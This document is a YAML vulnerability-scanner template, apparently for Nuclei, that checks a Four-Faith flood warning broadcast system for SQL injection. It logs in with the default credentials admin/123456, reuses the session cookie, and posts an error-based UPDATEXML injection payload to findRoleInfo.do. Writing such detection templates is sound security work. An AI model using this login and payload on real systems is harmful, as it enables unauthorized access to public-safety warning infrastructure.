id: poc-yaml-four-faith-fdwbs-findroleinfo-do-sqli
info:
  name: 四信通信泄洪预警广播系统 findRoleInfo.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects SQL injection vulnerability in the 四信通信泄洪预警广播系统 findRoleInfo.do endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: login-request
    method: POST
    path:
      - "{{BaseURL}}/userLogin.do"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: |
      userName=admin&userPwd=123456
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "true"
    extractors:
      - type: regex
        name: cookie
        internal: true
        part: header
        group: 1
        regex:
          - "JSESSIONID=(.*?);"

  - id: sqli-detection
    method: POST
    path:
      - "{{BaseURL}}/roleInfo/findRoleInfo.do"
    headers:
      Cookie: JSESSIONID={{cookie}}
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: |
      name=%25%27+OR+UPDATEXML%283975%2CCONCAT%280x2e%2Cmd5({{t1}})%2C%28SELECT+%28ELT%283975%3D3975%2C1%29%29%29%2C0x716a706a71%29%2C3853%29+AND+%27fEDT%25%27%3D%27fEDT&rows=10&page=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
          - "XPATH"
          - "syntax"
          - "error"
